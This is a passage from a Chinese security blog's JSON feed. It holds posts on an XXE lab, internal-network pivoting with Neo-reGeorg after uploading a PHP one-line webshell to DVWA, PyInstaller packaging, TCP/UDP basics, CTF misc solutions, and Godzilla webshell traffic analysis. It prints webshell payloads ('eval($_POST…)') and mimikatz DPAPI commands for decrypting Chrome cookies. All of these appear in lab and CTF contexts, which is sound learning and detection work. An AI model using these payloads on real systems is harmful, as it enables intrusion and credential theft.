&quot;http://IP/xxe-lab/php_xxe/doLogin.php&quot;</span><br><span class=\"line\">    # 创建payload文件</span><br><span class=\"line\">    ExportPayload(lip, lport)</span><br><span class=\"line\">    # HTTP服务线程</span><br><span class=\"line\">    threadHTTP = threading.Thread(target=StartHTTP, args=(lip, lport))</span><br><span class=\"line\">    threadHTTP.start()</span><br><span class=\"line\">    # 发送POST数据线程</span><br><span class=\"line\">    threadPOST = threading.Thread(target=SendData, args=(lip, lport，url))</span><br><span class=\"line\">    threadPOST.start()</span><br></pre></td></tr></table></figure></p>\n<p><strong>防御策略</strong></p>\n<blockquote>\n<p>XXE 的危害不仅在于攻击服务器，还能通过 XXE 进行内网的端口探测以及攻击内网网站等<br />\n防御方式：</p>\n</blockquote>\n<p>1. 默认禁止外部实体的解析</p>\n<p>2. 对用户提交的 XML 数据进行过滤，如关键词 &lt;!DOCTYPE 和 &lt;!ENTITY 或者 SYSTEM 和 PUBLIC 等</p>\n",
            "tags": [
                "其它",
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E6%B5%85%E6%9E%90%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%9A%84%E6%90%AD%E5%BB%BA/",
            "url": "https://nnnpc.github.io/2024/04/16/%E6%B5%85%E6%9E%90%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%9A%84%E6%90%AD%E5%BB%BA/",
            "title": "浅析内网代理的搭建",
            "date_published": "2024-04-16T05:58:19.053Z",
            "content_html": "<p>工具：Neo-reGeorg</p>\n<p>这段时间打了一个渗透赛，也是通过这次机会向独奏师傅学习到了好多东西</p>\n<p>在这里先简单记录一下</p>\n<p>首先内网代理搭建就是为了让内网能够被自己的机子正常访问服务</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/306zpHzXyILqO3mf.jpg!thumbnail\" alt=\"\" /></p>\n<p>这里附上一副图，cms-phpok 便是代表的使外网的机子，而后面的 solr 代表的便是内网的机子，在外网没有 getshell，没有搭建代理，是无法正常访问内网的机子的，因此在这里记录一下 getshell 之后搭建内网代理的过程</p>\n<p>首先先拿到一台有 web 服务的服务器，这里简单一些就直接拿一台部署过 dvwa 靶场的服务器来做示例了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IZ4Jr7evru8QPAQ4.png!thumbnail\" alt=\"\" /></p>\n<p>首先先正常登录，找到上传点，上传一句话木马</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?= @eval($_POST&#123;&#x27;a&#x27;&#125;);?&gt;</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cVoUo74iMEloeN0B.png!thumbnail\" alt=\"\" /></p>\n<p>使用蚁剑 getshell</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8QMV9I5CChjCcZG0.png!thumbnail\" alt=\"\" /></p>\n<p>然后我们能在根目录看到有个 tmp 目录，有个小 tips 就是可以在这里上传扫描工具，比如 fscan 什么的，就能实现在它的机子上扫描内网 ip 了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Pb4lRT2DAFnAOhBF.png!thumbnail\" alt=\"\" /></p>\n<p>我这里上传了一个 fscan 作为示例，内网地址的话本次的比赛是给了，但是也可以自己找，一种方法就是在虚拟终端 ip<br />\naddr 查看</p>\n<p>还有一种方法以这台机子为例</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QczlTQbb1iudJYdV.png!thumbnail\" alt=\"\" /></p>\n<p>进入根目录下发现使用 docker 搭建的，那么直接 cat<br />\n/etc/hosts，也能够找到内网的 ip</p>\n<p>这里就不展示了，接下来讲述内网代理的搭建工具 Neo-reGeorg</p>\n<p>首先在原先上传马的目录先上传工具 Neo-reGeorg\\neoreg_servers 目录下的 tunnel.php，接着打开自己的终端运行 python 工具脚本</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 neoreg.py -k key -u ip/目录/tunnel.php</span><br></pre></td></tr></table></figure></p>\n<p>-k 代表的是 key，可以去 Neo-reGeorg\\neoreg_servers 目录下的 key.txt 查看<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7zlxNRpWUs98OOEk.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>接着在自己的浏览器使用 SwitchyOmega 使用 SOCKS5 协议</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/q8JFmBf9ygpojSpH.png!thumbnail\" alt=\"\" /></p>\n<p>点击应用即可，再在浏览器右上角将代理切换至刚才配置好的自己设置的名称，就会发现自己的 ip 已经切换至目标机子的服务器，就能够正常访问内网了</p>\n",
            "tags": [
                "其它",
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E8%BD%AC%E6%8D%A2/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E8%BD%AC%E6%8D%A2/",
            "title": "可执行文件的转换",
            "date_published": "2024-04-16T05:58:19.050Z",
            "content_html": "<blockquote>\n<p>当开发者向普通用户分享程序时，为了方便用户在未安装 Python 环境的情况下能够正常运行，需要将开发好的程序进行打包，转换成用户可运行的文件类型。<br />\nPyInstaller 是常见的执行文件打包工具。该工具的安装方式十分简单，可运行在 Windows、MacOS<br />\nX 和 GUN/Linux 操作系统环境中，支持 Python2 和 Python3 两种版本，并且在不同的操作系统环境中，PyInstaller 工具的使用方法和选项相同。<br />\n需要注意的是，用 PyInstaller 打包的执行文件，只能在与执行打包操作的系统类型相同的环境下运行。也就是说这样的执行文件不具备可移植性，比如在 Windows 系统下用 PyInstaller 生成的执行文件只能运行在 Windows 环境，在 Linux 系统下生成的执行文件只能运行在 Linux 环境。<br />\n总的来说：虽然在不同的操作系统下 PyInstaller 工具的使用方法和选项相同，但是在哪一个操作系统下执行打包操作，该生成的执行文件就只能在该系统环境下运行</p>\n</blockquote>\n<p><strong>1. 在 Windows 系统下转换</strong></p>\n<p>首先从官方网站（<span class=\"exturl\" data-url=\"aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L3B5aW5zdGFsbGVyLw==\">https://pypi.org/project/pyinstaller</span>）下载 PyInstaller 的安装包，将下载好的 PyInstaller 压缩包文件进行解压</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/oSQ0R0uZ8SqxgcUr.png!thumbnail\" alt=\"\" /></p>\n<p>解压好的文件夹下包含 setup.py 文件。可通过执行如下命令对 PyInstaller 进行安装</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8vBFPWjTx3Jk4BM7.png!thumbnail\" alt=\"\" /></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 setup.py install</span><br></pre></td></tr></table></figure></p>\n<p>但是可能会出现一些报错，可以尝试以下 pip install<br />\npyinstaller，当然如果还是报错的话可以下载 whl 文件，如图</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/chJfo7BxMzzpbZNT.png!thumbnail\" alt=\"\" /></p>\n<p>再用命令进行安装</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install pyinstaller-5.7.0-py3-none-win_amd64.whl</span><br></pre></td></tr></table></figure></p>\n<p>安装完成之后就是进行打包了，准备好需要打包的文件和需要绑定的图标，图标需为.ico 后缀。将两个文件放入同一个文件夹中，再在该路径下开启 cmd 运行命令进行打包</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pyinstaller -F -i cat.ico encode.py</span><br></pre></td></tr></table></figure></p>\n<p>执行效果：<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/iGVf6dyGN2TARGE3.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>执行之后的文件可以在 dist 文件夹中找到</p>\n<p><strong>2. 在 Linux 系统下的转换</strong></p>\n<p>这里使用 Ubuntu 进行演示，使用命令进行安装</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install pyinstaller</span><br></pre></td></tr></table></figure></p>\n<p>安装完成后执行打包操作（同样需要找到一个指定目录，这里就直接在桌面上执行打包，生成的目录也自然就在桌面上了）</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pyinstaller -F encode.py</span><br></pre></td></tr></table></figure></p>\n<p>执行效果：<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZIcJGnoZbtMpuZ0O.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>成功之后同样可以在 dist 目录中找到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lmJYorSCSkYKOHKJ.png!thumbnail\" alt=\"\" /></p>\n<p>pyinstaller 安装方法挺多的，如果遇到一些比较难解决的报错可以尝试换一种方法进行下载，本人 windows 下载就是用 whl 文件，linux 是直接 pip 就可以了</p>\n",
            "tags": [
                "python",
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "title": "关于TCP与UDP协议的学习",
            "date_published": "2024-04-16T05:58:19.049Z",
            "content_html": "<p>TCP 协议的三次握手，传输确认，四次挥手</p>\n<hr />\n<h2 id=\"一tcp三次握手\"><a class=\"anchor\" href=\"#一tcp三次握手\">#</a> 一.TCP 三次握手</h2>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mcwMZ9QmuxvnWDoH.png!thumbnail\" alt=\"\" /></p>\n<p>刚开始由客户端 1 发送给服务端 2<br />\nSYN 包，询问服务端是否能与其建立练接。服务端同意后回了<br />\n SYN+ACK 包给客户端 3，客户端 3 再回 ACK 包给服务端 4，三次握手建立，连接成功。</p>\n<h2 id=\"二传输确认\"><a class=\"anchor\" href=\"#二传输确认\">#</a> 二。传输确认</h2>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">个人理解认为，传输确认这一步骤很大原因是为了防止丢包，保证TCP协议的稳定可靠性。</span><br></pre></td></tr></table></figure></p>\n<p><strong>发送缓冲区：0 1 2 3 4 5 6 7 8 9 10 11 12</strong></p>\n<p><strong>发送报文：序列号 + 长度 + 发送缓冲区中的数据内容</strong></p>\n<p><strong>回复确认：ACK = 序列号 + 长度 = 下一包的起始序列号</strong></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">由三次握手可以确认客户端与服务端传输的是同一次的包，防止丢包现象的发生，同时也因为拥有数据内容，客户端也可以传输数据片段给服务端，服务端再根据数据片段重新拼装成完整的数据内容。（同时这也可以让服务端确认缺失了哪一段数据，要求客户端重新发送）</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"三四次挥手\"><a class=\"anchor\" href=\"#三四次挥手\">#</a> 三。四次挥手</h2>\n<p>ps：客户端与服务端都可以发起关闭请求</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QaD478U79fT9rvRF.png!thumbnail\" alt=\"\" /></p>\n<p>四次挥手流程：</p>\n<p>1-&gt;2：客户端向服务端发送了 FIN 包然后进入了 3（终止等待 1 状态）</p>\n<p>2-&gt;3：服务端回了 ACK 包给 3 后进入了 4（关闭等待状态），而 3 收到了 ACK 包以后进入了 5（终止等待 2 状态）</p>\n<p>（此时服务端还能发送数据，客户端还能接收数据，待数据传输完成后开始下一步。）</p>\n<p>4-&gt;5：确认传输完成后 4 会向 5 发送 FIN 包，然后进入 6（最后的确认状态）</p>\n<p>5-&gt;6：5 收到来自 4 的 FIN 包以后会向 6 发送 ACK 包，然后进入超时等待状态</p>\n<p>6-&gt;8：当 6 收到来自 5 的 ACK 包后会立马进入 8（也就是立马关闭）</p>\n<p>7-&gt;9：经过超时时间后会自动关闭也就是 7-&gt;9</p>\n<p><strong>ps：为什么要有超时等待状态：</strong></p>\n<p><strong>（一句话概括就是为了确保服务端关闭）</strong></p>\n<p><strong>详：是为了确认服务端收到 ACK 包（如不等待且服务端没有收到 ACK 包，那么服务端就会停留在最后的确认状态）。等待时，如服务端未收到 ACK 包，那么就会重复 4-&gt;5，服务端重新发送 FIN 包，而客户端收到后也就会重新发送 ACK 包（超时等待时间也会被重新刷新）。</strong></p>\n<h2 id=\"udp协议非连接\"><a class=\"anchor\" href=\"#udp协议非连接\">#</a> UDP 协议（非连接）</h2>\n<p>简单封装数据包并从网卡发出，数据包间无状态上的联系</p>\n<p>因此推出 UDP 的特征：1. 性能损耗少 2. 资源占用少 3. 稳定性弱</p>\n<hr />\n<p><strong>TCP 与 UDP 差异：</strong></p>\n<p><strong>1.TCP 面向连接，UDP 面向报文</strong></p>\n<p><strong>2.TCP 对系统资源要求较多，UDP 结构相对简单</strong></p>\n<p><strong>3.TCP 稳定可靠，UDP 传输数据快</strong></p>\n<p>TCP 用于传输文件，发送邮件，浏览网页等</p>\n<p>（用于对传输质量要求较高的地方）</p>\n<p>UDP 用于域名查询，语音通话，视频直播等</p>\n<p>还可以用于隧道网络：VPN，VXLAN</p>\n<p>（用于对速度要求高，但是对少量丢包没有太大要求的场景）</p>\n",
            "tags": [
                "其它",
                "w10",
                "其它"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%8F%A4%E5%89%91%E5%B1%B1%20Misc/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%8F%A4%E5%89%91%E5%B1%B1%20Misc/",
            "title": "古剑山 Misc",
            "date_published": "2024-04-16T05:58:19.047Z",
            "content_html": "<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"i-have-the-flag\"><a class=\"anchor\" href=\"#i-have-the-flag\">#</a> i have the flag</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208131607810.png\" alt=\"\" /></p>\n<p>附件得到 js 文件和 html，分析 js 代码和前端代码的关系</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208131905062.png\" alt=\"\" /></p>\n<p>html 中调用了 checkToken 函数</p>\n<p>js 代码中的 checkToken 是这么写的</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132018245.png\" alt=\"\" /></p>\n<p>但是直接进行校验明显不对</p>\n<p>发现 ic 是判断条件，需要跟踪寻找 ic</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132209608.png\" alt=\"\" /></p>\n<p>直接写脚本逆向即可</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key1=[118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54]</span><br><span class=\"line\">token=&quot;&quot;</span><br><span class=\"line\">for i in key1:</span><br><span class=\"line\">   token+=chr(i-3)</span><br><span class=\"line\">print(token)</span><br></pre></td></tr></table></figure></p>\n<p>得到：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">simpleedu123</span><br></pre></td></tr></table></figure></p>\n<p>放入前端进行校验</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132607674.png\" alt=\"\" /></p>\n<p><strong>flag{muWn9NU0H6erBN/w+C7HVg}</strong></p>\n<h3 id=\"幸运饼干\"><a class=\"anchor\" href=\"#幸运饼干\">#</a> 幸运饼干</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208132729310.png\" alt=\"\" /></p>\n<p>得到两个文件，发现 flag.zip 被加密，且其中也有同样的 hint.jpg，直接明文爆破</p>\n<p>将 hint.jpg 用 bandzip 进行压缩之后 ARCHPR 明文爆破</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133048604.png\" alt=\"\" /></p>\n<p>解压出四个文件</p>\n<p>在 admin.txt 中对 ntlm 进行解码得到 password：54231</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133453442.png\" alt=\"\" /></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133520532.png\" alt=\"\" /></p>\n<p>接着根据 SID 压缩包中的 GUID 文件，利用 mimikatz 获取到 masterkey</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::masterkey /in:&quot;master.key&quot; /sid:S-1-5-21-726299542-2485387390-1117163988-1001 /password:54231</span><br></pre></td></tr></table></figure></p>\n<p>这里的 master.key 文件就是 SID 压缩包中的文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133724082.png\" alt=\"\" /></p>\n<p>得到 key</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac</span><br></pre></td></tr></table></figure></p>\n<p>再利用 key 对 Cookies 进行 chrome 解密得到 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">dpapi::chrome /in:Cookies /masterkey: 7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac /file:Cookies</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208133830546.png\" alt=\"\" /></p>\n<p><strong>flag{mimikatz_is_bravo_xzjc72}</strong></p>\n<h3 id=\"数独\"><a class=\"anchor\" href=\"#数独\">#</a> 数独</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208134732690.png\" alt=\"\" /></p>\n<p>附件得到两张图片</p>\n<p>不知道算不算非预期，gaps 算好 size 一把梭就好了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gaps --image=image.png --generations=40 --population=120 --size=70</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208134842612.png\" alt=\"\" /></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231208134921583.png\" alt=\"\" /></p>\n<p>按顺序拼接得到 flag</p>\n<p><strong>flag{4e4d6c332b6fe62a63afe56171fd3725}</strong></p>\n<h3 id=\"jpginside\"><a class=\"anchor\" href=\"#jpginside\">#</a> jpginside</h3>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231210104436420.png\" alt=\"\" /></p>\n<p>查看文件头发现是 pyc 文件，修改后缀进行反编译</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">store = [] #数据太长已省略</span><br><span class=\"line\">key = raw_input(&#x27;Please input the key:&#x27;)</span><br><span class=\"line\">with open(&#x27;excellent.jpg&#x27;, &#x27;wb&#x27;) as jpg:</span><br><span class=\"line\">    for i in range(len(store)):</span><br><span class=\"line\">        jpg.write(chr(store[i] ^ ord(key[i % len(key)])))</span><br></pre></td></tr></table></figure></p>\n<p>key[i %<br />\n len (key)] 在前几位还是 key [i] 本身，可以根据异或反推出 key：rotate1234!</p>\n<p>再根据 key 推回完整的 jpg 文件</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">store = [] #数据已省略</span><br><span class=\"line\">key = &#x27;rotate1234!&#x27;</span><br><span class=\"line\">with open(&#x27;out.jpg&#x27;, &#x27;wb&#x27;) as jpg:</span><br><span class=\"line\">    for i in range(len(store)):</span><br><span class=\"line\">        jpg.write(bytes([store[i] ^ ord(key[i % len(key)])]))</span><br></pre></td></tr></table></figure></p>\n<p>发现文件末尾有 zip 文件，其中头部两字节被修改</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231210112208349.png\" alt=\"\" /></p>\n<p>改回 504b 手撕出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231210112320787.png\" alt=\"\" /></p>\n<p>得到加密 txt，密码就是 key，得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jpek&#123;39i0jf49229fie5j33f02403hj953012&#125;</span><br></pre></td></tr></table></figure></p>\n<p>凯撒枚举偏移得到 flag</p>\n<p><strong>flag{39e0fb49229bea5f33b02403df953012}</strong></p>\n",
            "tags": [
                "MISC",
                "MISC"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%93%A5%E6%96%AF%E6%8B%89v4.01%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%93%A5%E6%96%AF%E6%8B%89v4.01%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "哥斯拉v4.01流量浅析",
            "date_published": "2024-04-16T05:58:19.045Z",
            "content_html": "<p>前段时间稍微看了下哥斯拉的一些流量相关的知识点，今天就来稍微记录一下</p>\n<p>首先我就在 NSSCTF 平台开了一个 DVWA 的靶场，用文件上传来进行说明，首先先进行哥斯拉的常规使用</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/tYwSyXaBAubhQ2aj.png!thumbnail\" alt=\"\" /></p>\n<p>在哥斯拉左上角点击管理 -&gt; 生成</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/trsNIZqYtmGpWpWq.png!thumbnail\" alt=\"\" /></p>\n<p>在如下的两个地方选择载荷和加密器，这里就选择 php 的 eval_xor_base64</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4T7VyxuaX0P0dyju.png!thumbnail\" alt=\"\" /></p>\n<p>点击生成</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">eval($_POST[&quot;pass&quot;]);</span><br></pre></td></tr></table></figure></p>\n<p>会发现是最普通的一句话木马，接着由于靶场的最低级的限制，直接上传 php 文件<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1nWr1HheRSV0yqLd.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>在哥斯拉左上角点击目标添加</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/miphcOVjEc0gIKEg.png!thumbnail\" alt=\"\" /></p>\n<p>在 URL 处填写好木马存放的位置，并将有效载荷和加密器调整为木马所对应的种类，测试连接为 success 即可添加</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TIsUGlkMcq1lhJSu.png!thumbnail\" alt=\"\" /></p>\n<p>接着右键进入，就能够找到如下的命令执行界面了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nTgTAk3t7gdzh5PS.png!thumbnail\" alt=\"\" /></p>\n<p>基本的使用介绍完了，接下来就自己抓取流量来进行分析</p>\n<p>使用 wireshark 进行捕获</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sp0Dnl5fE8s5wP6Z.png!thumbnail\" alt=\"\" /></p>\n<p>使用 ls 和 ls / 两条命令来进行测试</p>\n<p>首先在 tcp 流 13 发现了哥斯拉的特征流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kICWJZ8g22hWD5EP.png!thumbnail\" alt=\"\" /></p>\n<p>借着该流来分析一下哥斯拉的流量特征</p>\n<ol>\n<li>Cookie<br />\n 这是一个强特征，在请求包 cookie 中有一个非常明显的就是末尾带分号</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Sol2NjTPk0is6yDj.png!thumbnail\" alt=\"\" /></p>\n<ol>\n<li>Accept<br />\n 算一个弱特征，与之前出现过的冰蝎相似，上网搜了一下，发现其实这个也是 JDK 引入的一个特征，并不是作者自定义的 Accept</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6rVe3Oi3o4syVQu4.png!thumbnail\" alt=\"\" /></p>\n<ol>\n<li>响应体<br />\n这个可以算是特征比较明显的一个点了，从代码可以看到它是把一串 32 位的 md5 字符串等量拆分后分别放在 base64 编码的前后。总体的结构便为：前 16 位 md5+base64 编码 + 后 16 位 md5</li>\n</ol>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/V9vRwHft8bC2CEJ7.png!thumbnail\" alt=\"\" /></p>\n<p>接下来解密一下流量看看</p>\n<p>这里使用的解密脚本是 github 上的一个 python 脚本</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dlYnJheWJ0bC93ZWJzaGVsbF9kZXRlY3Q=\">https://github.com/webraybtl/webshell_detect</span><br />\n 之前我们使用的加密体是 php_eval_xor_base64，因此请求体的构成为明文可执行代码 + 加密数据，在脚本内找到对应的解密模块</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span 